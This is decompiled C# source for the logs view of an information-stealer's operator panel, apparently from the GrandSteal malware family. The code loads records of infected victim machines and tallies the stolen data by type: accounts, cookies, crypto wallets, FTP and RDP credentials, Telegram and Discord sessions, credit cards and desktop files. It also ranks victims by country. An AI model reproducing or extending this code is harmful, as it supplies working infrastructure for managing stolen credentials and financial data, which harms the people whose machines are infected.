using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Reactive;
using System.Reactive.Concurrency;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using Buffalo.DataAccess.Storage;
using DynamicData;
using GrandSteal.Server.Data.Extensions.Collection;
using GrandSteal.Server.Data.Repository;
using GrandSteal.SharedModels.Models;
using ReactiveUI;

namespace MysteryPanel.ViewModels
{
	// Token: 0x0200002A RID: 42
	public class LogsViewModel : SchedulerResolver
	{
		// Token: 0x17000076 RID: 118
		// (get) Token: 0x06000180 RID: 384 RVA: 0x000032EE File Offset: 0x000014EE
		public ConcurrentBufferedCollection<RemoteClientInformation> Logs { get; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x06000181 RID: 385 RVA: 0x000032F6 File Offset: 0x000014F6
		// (set) Token: 0x06000182 RID: 386 RVA: 0x000032FE File Offset: 0x000014FE
		public CounterStorage StorageOfCounters
		{
			[CompilerGenerated]
			get
			{
				return this.<StorageOfCounters>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<StorageOfCounters>k__BackingField, value))
				{
					return;
				}
				this.<StorageOfCounters>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.StorageOfCounters);
			}
		}

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x06000183 RID: 387 RVA: 0x00003323 File Offset: 0x00001523
		// (set) Token: 0x06000184 RID: 388 RVA: 0x0000332B File Offset: 0x0000152B
		public PathsToLogsStorage PathsToLogs
		{
			[CompilerGenerated]
			get
			{
				return this.<PathsToLogs>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<PathsToLogs>k__BackingField, value))
				{
					return;
				}
				this.<PathsToLogs>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.PathsToLogs);
			}
		}

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x06000185 RID: 389 RVA: 0x00003350 File Offset: 0x00001550
		// (set) Token: 0x06000186 RID: 390 RVA: 0x00003358 File Offset: 0x00001558
		public Dictionary<string, double> CountrisCounters
		{
			[CompilerGenerated]
			get
			{
				return this.<CountrisCounters>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<CountrisCounters>k__BackingField, value))
				{
					return;
				}
				this.<CountrisCounters>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.CountrisCounters);
			}
		}

		// Token: 0x1700007A RID: 122
		// (get) Token: 0x06000187 RID: 391 RVA: 0x0000337D File Offset: 0x0000157D
		// (set) Token: 0x06000188 RID: 392 RVA: 0x00003385 File Offset: 0x00001585
		public BindingList<string> Top10
		{
			[CompilerGenerated]
			get
			{
				return this.<Top10>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				if (object.Equals(this.<Top10>k__BackingField, value))
				{
					return;
				}
				this.<Top10>k__BackingField = value;
				this.<>OnPropertyChanged(<>PropertyChangedEventArgs.Top10);
			}
		}

		// Token: 0x1700007B RID: 123
		// (get) Token: 0x06000189 RID: 393 RVA: 0x000033AA File Offset: 0x000015AA
		public ReactiveCommand<Unit, Unit> ClearCommand { get; }

		// Token: 0x0600018A RID: 394 RVA: 0x0000787C File Offset: 0x00005A7C
		public LogsViewModel(IScheduler scheduler) : base(scheduler)
		{
			this.StorageOfCounters = new CounterStorage(false);
			this.PathsToLogs = new PathsToLogsStorage(false);
			this.countryLock = new object();
			this.CountrisCounters = new Dictionary<string, double>();
			this.Top10 = new BindingList<string>
			{
				AllowEdit = true,
				AllowNew = true,
				AllowRemove = true,
				RaiseListChangedEvents = true
			};
			ProtoDataProvider<RemoteClientInformation> protoDataProvider = new ProtoDataProvider<RemoteClientInformation>();
			protoDataProvider.Load();
			this.Logs = new ConcurrentBufferedCollection<RemoteClientInformation>(protoDataProvider, (RemoteClientInformation x, RemoteClientInformation y) => x.Id == y.Id);
			this.ClearCommand = ReactiveCommand.Create(new Action(this.ClearLogs), null, null);
		}

		// Token: 0x0600018B RID: 395 RVA: 0x00007938 File Offset: 0x00005B38
		private void ClearLogs()
		{
			this.StorageOfCounters.TotalAccounts = 0;
			this.StorageOfCounters.TotalCookies = 0;
			this.StorageOfCounters.TotalCryptoWallets = 0;
			this.StorageOfCounters.TotalFtps = 0;
			this.StorageOfCounters.TotalRDP = 0;
			this.StorageOfCounters.TotalTelegram = 0;
			this.StorageOfCounters.TotalCreditCards = 0;
			this.StorageOfCounters.TotalDiscord = 0;
			this.StorageOfCounters.TotalWinStoreCreds = 0;
			this.StorageOfCounters.TotalDesktopFiles = 0;
			this.PathsToLogs.SetDefaults();
			this.Logs.Clear();
		}

		// Token: 0x0600018C RID: 396 RVA: 0x000079D4 File Offset: 0x00005BD4
		private async void CalculateCounters()
		{
			try
			{
				RemoteClientInformation[] items = this.Logs.Collection.ToArray<RemoteClientInformation>();
				Dictionary<string, double> countrisCounters = await this.CalcCountries(items);
				this.CountrisCounters = countrisCounters;
				object obj = this.countryLock;
				lock (obj)
				{
					this.Top10.Clear();
					this.Top10.Add(string.Format("  {0,-10} {1,9}", "Country", "Count"));
					this.Top10.Add(string.Empty);
					if (this.CountrisCounters.Count > 0)
					{
						this.Top10.Add(from item in (from x in this.CountrisCounters
						orderby x.Value descending
						select x).Take(10)
						select string.Format("    {0,-8} {1,7}", item.Key, item.Value));
					}
				}
			}
			catch (Exception ex)
			{
				SystemMessageHandler onSystemLog = this.OnSystemLog;
				if (onSystemLog != null)
				{
					onSystemLog("LogsViewModel", "CalculateCounters error: " + ex.ToString());
				}
			}
		}

		// Token: 0x0600018D RID: 397 RVA: 0x00007A10 File Offset: 0x00005C10
		private async Task<Dictionary<string, double>> CalcCountries(IEnumerable<RemoteClientInformation> items)
		{
			return await Task.Factory.StartNew<Dictionary<string, double>>(delegate()
			{
				Dictionary<string, double> result;
				try
				{
					result = items.CountBy((RemoteClientInformation x) => x.Country);
				}
				catch (Exception ex)
				{
					SystemMessageHandler onSystemLog = this.OnSystemLog;
					if (onSystemLog != null)
					{
						onSystemLog("LogsViewModel", "CalcCountriesTask error: " + ex.ToString());
					}
					result = new Dictionary<string, double>();
				}
				return result;
			});
		}

		// Token: 0x0600018E RID: 398 RVA: 0x00007A60 File Offset: 0x00005C60
		public override void Load()
		{
			this.StorageOfCounters.Load();
			this.PathsToLogs.Load();
			this.Logs.Collection.ListChanged += delegate(object _, ListChangedEventArgs args)
			{
				this.CalculateCounters();
			};
			SystemMessageHandler onSystemLog = this.OnSystemLog;
			if (onSystemLog == null)
			{
				return;
			}
			onSystemLog("LogsViewModel", "Loaded");
		}

		// Token: 0x040000CB RID: 203
		private readonly object countryLock;

		// Token: 0x040000CC RID: 204
		public SystemMessageHandler OnSystemLog;
	}
}
